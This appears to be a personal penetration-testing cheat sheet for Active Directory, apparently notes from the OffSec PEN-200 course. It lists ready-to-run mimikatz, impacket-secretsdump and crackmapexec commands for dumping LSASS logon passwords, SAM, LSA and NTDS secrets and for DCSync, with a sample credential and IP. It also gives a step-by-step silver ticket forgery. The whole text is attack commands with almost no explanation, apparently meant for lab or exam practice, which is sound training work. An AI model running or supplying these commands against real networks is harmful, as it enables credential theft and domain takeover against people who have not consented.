
### Secret Dumping 
```
#MIMIDUMP
.\mimikatz.exe "privilege::debug" "log mimikatz_passwords.txt" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::lsa /patch" "exit"

#DC SYNC
lsadump::dcsync /user:<domain>\<user>
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

#SAM / NTDS DUMP
impacket-secretsdump <user>@<ip>
crackmapexec smb <ip> -u <user> -p <password> --sam / --lsa / --ntds
```

### Silver Tickets
Is there an interesting service running such as an HTTP or SMB share that can't be accessed?
https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/silver-tickets
```
#Grab SID of your user.
whoami /user

#Open mimi
privilege::debug

#Grab NTLM hash of service account
sekurlsa::logonpasswords

#Generate ticket
kerberos::golden /sid:<id> /domain:<domin> /ptt /target:<ip/dnsname> /service:<protocol eg. http /smb> /rc4:<ntlm_of_service> /user:<our_adminuser>

#Check ticket
klist

#Access service
example: iwr -UseDefaultCredentials http://<target>
```

